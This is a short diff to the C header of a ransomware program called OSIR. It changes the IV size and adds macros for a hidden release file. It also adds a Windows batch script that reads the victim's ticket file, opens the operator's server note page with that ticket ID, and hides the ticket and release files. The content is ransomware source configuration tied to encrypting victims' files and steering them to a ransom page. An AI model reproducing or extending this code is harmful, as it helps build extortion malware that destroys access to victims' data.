@@ -20,15 +20,18 @@
 
 	//Cryptographical macros
 #    define SYMMETRIC_KEY_SIZE 128/8	//bytes
-#    define SYMMETRIC_IV_SIZE 64/8	//bytes
+#    define SYMMETRIC_IV_SIZE 128/8	//bytes
 #    define ASYMMETRIC_KEY_ID 1
 
 	//Ransom macros
 #    define MAX_BYTES_TO_ENCRYPT 16*1024
 #    define TICKET_FILENAME ".osir_ticket"
+#    define RELEASE_FILENAME ".osir_release"
 #    define RANSOM_EXTENSION ".ransom"
 #    ifdef _WIN32
-#        define RELEASE_INTRO_SCRIPT "title OSIR&color 0f&cls"
+#        define RELEASE_SCRIPT_FILENAME "release.bat"
+#        define RELEASE_INTRO_SCRIPT "title OSIR&cls"
+#        define RELEASE_SCRIPT "@echo off\nfor /f \"tokens=*\" %%a in ('type .osir_ticket') do set x=%%a\nstart "SERVER_OSIR_HOME"/note.php?ticket=%x%\nattrib +h "RELEASE_FILENAME"\nattrib +h "TICKET_FILENAME"\n"RELEASE_FILENAME
 #    else
 #        define RELEASE_INTRO_SCRIPT "clear"
 #    endif
